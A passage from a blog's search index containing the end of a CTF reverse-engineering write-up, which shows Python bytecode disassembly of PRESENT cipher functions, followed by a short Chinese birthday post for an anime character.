class="line">Disassembly of &lt;code object generateRoundkeys80 at 0x7f133db26a80, file &quot;&quot;, line 2&gt;:</span><br><span class="line">  3           0 BUILD_LIST               0</span><br><span class="line">              2 STORE_FAST               2 (roundkeys)</span><br><span class="line"></span><br><span class="line">  4           4 LOAD_GLOBAL              0 (range)</span><br><span class="line">              6 LOAD_CONST               1 (1)</span><br><span class="line">              8 LOAD_FAST                1 (rounds)</span><br><span class="line">             10 LOAD_CONST               1 (1)</span><br><span class="line">             12 BINARY_ADD</span><br><span class="line">             14 LOAD_CONST               1 (1)</span><br><span class="line">             16 CALL_FUNCTION            3</span><br><span class="line">             18 GET_ITER</span><br><span class="line">        &gt;&gt;   20 FOR_ITER                90 (to 112)</span><br><span class="line">             22 STORE_FAST               3 (i)</span><br><span class="line"></span><br><span class="line">  5          24 LOAD_FAST                2 (roundkeys)</span><br><span class="line">             26 LOAD_METHOD              1 (append)</span><br><span class="line">             28 LOAD_FAST                0 (key)</span><br><span class="line">             30 LOAD_CONST               2 (16)</span><br><span class="line">             32 BINARY_RSHIFT</span><br><span class="line">             34 CALL_METHOD              1</span><br><span class="line">             36 POP_TOP</span><br><span class="line"></span><br><span class="line">  6          38 LOAD_FAST                0 (key)</span><br><span class="line">             40 LOAD_CONST               3 (524287)</span><br><span class="line">             42 BINARY_AND</span><br><span class="line">             44 LOAD_CONST               4 (61)</span><br><span class="line">             46 BINARY_LSHIFT</span><br><span class="line">             48 LOAD_FAST                0 (key)</span><br><span class="line">             50 LOAD_CONST               5 (19)</span><br><span class="line">             52 BINARY_RSHIFT</span><br><span class="line">             54 BINARY_ADD</span><br><span class="line">             56 STORE_FAST               0 (key)</span><br><span class="line"></span><br><span class="line">  7          58 LOAD_GLOBAL              2 (Sbox)</span><br><span class="line">             60 LOAD_FAST                0 (key)</span><br><span class="line">             62 LOAD_CONST               6 (76)</span><br><span class="line">             64 BINARY_RSHIFT</span><br><span class="line">             66 BINARY_SUBSCR</span><br><span class="line">             68 LOAD_CONST               6 (76)</span><br><span class="line">             70 BINARY_LSHIFT</span><br><span class="line">             72 LOAD_FAST                0 (key)</span><br><span class="line">             74 LOAD_CONST               7 (2)</span><br><span class="line">             76 LOAD_CONST               6 (76)</span><br><span class="line">             78 BINARY_POWER</span><br><span class="line">             80 LOAD_CONST               1 (1)</span><br><span class="line">             82 BINARY_SUBTRACT</span><br><span class="line">             84 BINARY_AND</span><br><span class="line">             86 BINARY_ADD</span><br><span class="line">             88 STORE_FAST               0 (key)</span><br><span class="line"></span><br><span class="line">  8          90 LOAD_FAST                0 (key)</span><br><span class="line">             92 LOAD_FAST                3 (i)</span><br><span class="line">             94 LOAD_CONST               8 (15)</span><br><span class="line">             96 BINARY_LSHIFT</span><br><span class="line">             98 LOAD_FAST                0 (key)</span><br><span class="line">            100 LOAD_CONST               5 (19)</span><br><span class="line">            102 BINARY_RSHIFT</span><br><span class="line">            104 BINARY_XOR</span><br><span class="line">            106 INPLACE_XOR</span><br><span class="line">            108 STORE_FAST               0 (key)</span><br><span class="line">            110 JUMP_ABSOLUTE           20</span><br><span class="line"></span><br><span class="line">  9     &gt;&gt;  112 LOAD_FAST                2 (roundkeys)</span><br><span class="line">            114 RETURN_VALUE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">             14 CALL_METHOD              1</span><br><span class="line">             16 STORE_NAME               3 (co)</span><br><span class="line"></span><br><span class="line">  6          18 LOAD_NAME                4 (exec)</span><br><span class="line">             20 LOAD_NAME                3 (co)</span><br><span class="line">             22 CALL_FUNCTION            1</span><br><span class="line">             24 POP_TOP</span><br><span class="line">             26 LOAD_CONST               3 (None)</span><br><span class="line">             28 RETURN_VALUE</span><br><span class="line"></span><br><span class="line">Disassembly of &lt;code object string2number at 0x7f7370421a80, file &quot;&quot;, line 2&gt;:</span><br><span class="line">  3           0 LOAD_GLOBAL              0 (sum)</span><br><span class="line">              2 LOAD_CLOSURE             0 (i)</span><br><span class="line">              4 BUILD_TUPLE              1</span><br><span class="line">              6 LOAD_CONST               1 (&lt;code object &lt;listcomp&gt; at 0x7f73704aba80, file &quot;&quot;, line 3&gt;)</span><br><span class="line">              8 LOAD_CONST               2 (&#x27;string2number.&lt;locals&gt;.&lt;listcomp&gt;&#x27;)</span><br><span class="line">             10 MAKE_FUNCTION            8 (closure)</span><br><span class="line">             12 LOAD_GLOBAL              1 (range)</span><br><span class="line">             14 LOAD_CONST               3 (8)</span><br><span class="line">             16 CALL_FUNCTION            1</span><br><span class="line">             18 GET_ITER</span><br><span class="line">             20 CALL_FUNCTION            1</span><br><span class="line">             22 CALL_FUNCTION            1</span><br><span class="line">             24 RETURN_VALUE</span><br><span class="line"></span><br><span class="line">Disassembly of &lt;code object &lt;listcomp&gt; at 0x7f73704aba80, file &quot;&quot;, line 3&gt;:</span><br><span class="line">  3           0 BUILD_LIST               0</span><br><span class="line">              2 LOAD_FAST                0 (.0)</span><br><span class="line">        &gt;&gt;    4 FOR_ITER                24 (to 30)</span><br><span class="line">              6 STORE_FAST               1 (c)</span><br><span class="line">              8 LOAD_GLOBAL              0 (ord)</span><br><span class="line">             10 LOAD_DEREF               0 (i)</span><br><span class="line">             12 LOAD_FAST                1 (c)</span><br><span class="line">             14 BINARY_SUBSCR</span><br><span class="line">             16 CALL_FUNCTION            1</span><br><span class="line">             18 LOAD_CONST               0 (8)</span><br><span class="line">             20 LOAD_FAST                1 (c)</span><br><span class="line">             22 BINARY_MULTIPLY</span><br><span class="line">             24 BINARY_LSHIFT</span><br><span class="line">             26 LIST_APPEND              2</span><br><span class="line">             28 JUMP_ABSOLUTE            4</span><br><span class="line">        &gt;&gt;   30 RETURN_VALUE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">             14 CALL_METHOD              1</span><br><span class="line">             16 STORE_NAME               3 (co)</span><br><span class="line"></span><br><span class="line">  9          18 LOAD_NAME                4 (exec)</span><br><span class="line">             20 LOAD_NAME                3 (co)</span><br><span class="line">             22 CALL_FUNCTION            1</span><br><span class="line">             24 POP_TOP</span><br><span class="line">             26 LOAD_CONST               3 (None)</span><br><span class="line">             28 RETURN_VALUE</span><br><span class="line"></span><br><span class="line">Disassembly of &lt;code object pLayer at 0x7f023882ba80, file &quot;&quot;, line 2&gt;:</span><br><span class="line">  3           0 LOAD_CONST               1 (0)</span><br><span class="line">              2 STORE_FAST               1 (output)</span><br><span class="line"></span><br><span class="line">  4           4 LOAD_GLOBAL              0 (range)</span><br><span class="line">              6 LOAD_CONST               2 (64)</span><br><span class="line">              8 CALL_FUNCTION            1</span><br><span class="line">             10 GET_ITER</span><br><span class="line">        &gt;&gt;   12 FOR_ITER                28 (to 42)</span><br><span class="line">             14 STORE_FAST               2 (i)</span><br><span class="line"></span><br><span class="line">  5          16 LOAD_FAST                1 (output)</span><br><span class="line">             18 LOAD_FAST                0 (state)</span><br><span class="line">             20 LOAD_FAST                2 (i)</span><br><span class="line">             22 BINARY_RSHIFT</span><br><span class="line">             24 LOAD_CONST               3 (1)</span><br><span class="line">             26 BINARY_AND</span><br><span class="line">             28 LOAD_GLOBAL              1 (PBox)</span><br><span class="line">             30 LOAD_FAST                2 (i)</span><br><span class="line">             32 BINARY_SUBSCR</span><br><span class="line">             34 BINARY_LSHIFT</span><br><span class="line">             36 INPLACE_ADD</span><br><span class="line">             38 STORE_FAST               1 (output)</span><br><span class="line">             40 JUMP_ABSOLUTE           12</span><br><span class="line"></span><br><span class="line">  6     &gt;&gt;   42 LOAD_FAST                1 (output)</span><br><span class="line">             44 RETURN_VALUE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">             14 CALL_METHOD              1</span><br><span class="line">             16 STORE_NAME               3 (co)</span><br><span class="line"></span><br><span class="line">  9          18 LOAD_NAME                4 (exec)</span><br><span class="line">             20 LOAD_NAME                3 (co)</span><br><span class="line">             22 CALL_FUNCTION            1</span><br><span class="line">             24 POP_TOP</span><br><span class="line">             26 LOAD_CONST               3 (None)</span><br><span class="line">             28 RETURN_VALUE</span><br><span class="line"></span><br><span class="line">Disassembly of &lt;code object sBoxLayer at 0x7fab1d117a80, file &quot;&quot;, line 2&gt;:</span><br><span class="line">  3           0 LOAD_CONST               1 (0)</span><br><span class="line">              2 STORE_FAST               1 (output)</span><br><span class="line"></span><br><span class="line">  4           4 LOAD_GLOBAL              0 (range)</span><br><span class="line">              6 LOAD_CONST               2 (16)</span><br><span class="line">              8 CALL_FUNCTION            1</span><br><span class="line">             10 GET_ITER</span><br><span class="line">        &gt;&gt;   12 FOR_ITER                36 (to 50)</span><br><span class="line">             14 STORE_FAST               2 (i)</span><br><span class="line"></span><br><span class="line">  5          16 LOAD_FAST                1 (output)</span><br><span class="line">             18 LOAD_GLOBAL              1 (Sbox)</span><br><span class="line">             20 LOAD_FAST                0 (state)</span><br><span class="line">             22 LOAD_FAST                2 (i)</span><br><span class="line">             24 LOAD_CONST               3 (4)</span><br><span class="line">             26 BINARY_MULTIPLY</span><br><span class="line">             28 BINARY_RSHIFT</span><br><span class="line">             30 LOAD_CONST               4 (15)</span><br><span class="line">             32 BINARY_AND</span><br><span class="line">             34 BINARY_SUBSCR</span><br><span class="line">             36 LOAD_FAST                2 (i)</span><br><span class="line">             38 LOAD_CONST               3 (4)</span><br><span class="line">             40 BINARY_MULTIPLY</span><br><span class="line">             42 BINARY_LSHIFT</span><br><span class="line">             44 INPLACE_ADD</span><br><span class="line">             46 STORE_FAST               1 (output)</span><br><span class="line">             48 JUMP_ABSOLUTE           12</span><br><span class="line"></span><br><span class="line">  6     &gt;&gt;   50 LOAD_FAST                1 (output)</span><br><span class="line">             52 RETURN_VALUE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">             14 CALL_METHOD              1</span><br><span class="line">             16 STORE_NAME               3 (co)</span><br><span class="line"></span><br><span class="line">  6          18 LOAD_NAME                4 (exec)</span><br><span class="line">             20 LOAD_NAME                3 (co)</span><br><span class="line">             22 CALL_FUNCTION            1</span><br><span class="line">             24 POP_TOP</span><br><span class="line">             26 LOAD_CONST               3 (None)</span><br><span class="line">             28 RETURN_VALUE</span><br><span class="line"></span><br><span class="line">Disassembly of &lt;code object addRoundKey at 0x7f5223878a80, file &quot;&quot;, line 2&gt;:</span><br><span class="line">  3           0 LOAD_FAST                0 (state)</span><br><span class="line">              2 LOAD_FAST                1 (roundkey)</span><br><span class="line">              4 BINARY_XOR</span><br><span class="line">              6 RETURN_VALUE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            210 CALL_METHOD              1</span><br><span class="line">            212 STORE_NAME               7 (co)</span><br><span class="line"></span><br><span class="line"> 12         214 LOAD_NAME                8 (exec)</span><br><span class="line">            216 LOAD_NAME                7 (co)</span><br><span class="line">            218 CALL_FUNCTION            1</span><br><span class="line">            220 POP_TOP</span><br><span class="line">            222 LOAD_CONST              69 (None)</span><br><span class="line">            224 RETURN_VALUE</span><br><span class="line"></span><br><span class="line">Disassembly of &lt;code object &lt;listcomp&gt; at 0x7f7b29b00a80, file &quot;&quot;, line 4&gt;:</span><br><span class="line">  4           0 BUILD_LIST               0</span><br><span class="line">              2 LOAD_FAST                0 (.0)</span><br><span class="line">        &gt;&gt;    4 FOR_ITER                14 (to 20)</span><br><span class="line">              6 STORE_FAST               1 (x)</span><br><span class="line">              8 LOAD_GLOBAL              0 (Sbox)</span><br><span class="line">             10 LOAD_METHOD              1 (index)</span><br><span class="line">             12 LOAD_FAST                1 (x)</span><br><span class="line">             14 CALL_METHOD              1</span><br><span class="line">             16 LIST_APPEND              2</span><br><span class="line">             18 JUMP_ABSOLUTE            4</span><br><span class="line">        &gt;&gt;   20 RETURN_VALUE</span><br><span class="line"></span><br><span class="line">Disassembly of &lt;code object &lt;listcomp&gt; at 0x7f7b29a76a80, file &quot;&quot;, line 9&gt;:</span><br><span class="line">  9           0 BUILD_LIST               0</span><br><span class="line">              2 LOAD_FAST                0 (.0)</span><br><span class="line">        &gt;&gt;    4 FOR_ITER                14 (to 20)</span><br><span class="line">              6 STORE_FAST               1 (x)</span><br><span class="line">              8 LOAD_GLOBAL              0 (PBox)</span><br><span class="line">             10 LOAD_METHOD              1 (index)</span><br><span class="line">             12 LOAD_FAST                1 (x)</span><br><span class="line">             14 CALL_METHOD              1</span><br><span class="line">             16 LIST_APPEND              2</span><br><span class="line">             18 JUMP_ABSOLUTE            4</span><br><span class="line">        &gt;&gt;   20 RETURN_VALUE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
</details>
]]></content>
      <categories>
        <category>CTF-WP</category>
      </categories>
  </entry>
  <entry>
    <title>12.3 KasakiNozomi&#39;s Birthday!</title>
    <url>/2023/12/02/12-3-KasakiNozomi-s-Birthday/</url>
    <content><![CDATA[<p><strong>今天是伞哥哥的生日啊！</strong></p>
<span id="more"></span>
<p><img src="https://s2.loli.net/2023/12/03/uknXZsdHrz42wPN.jpg" alt="3092507-20230224232909457-349401112.jpg"></p>
<p>我最最最最最最最喜欢的角色啊！！！<br>感谢京阿尼 感谢京吹 感谢利兹与青鸟~<br>这也差不多是入坑二次元一年吧~ 这一年来也改变了许许多多~<br>借霙的话吧~<br>喜欢希美的笑声        喜欢希美的一言一语<br>喜欢希美的脚步声      喜欢希美的头发<br>喜欢……<br>希美的一切~<br>🎂🎂🎂🎂🎂🎂🎂🎂🎂🎂🎂🎂🎂🎂🎂🎂🎂🎂🎂🎂🎂🎂🎂🎂🎂🎂🎂🎂🎂🎂🎂</p>
]]></content>
  </entry>
</search>
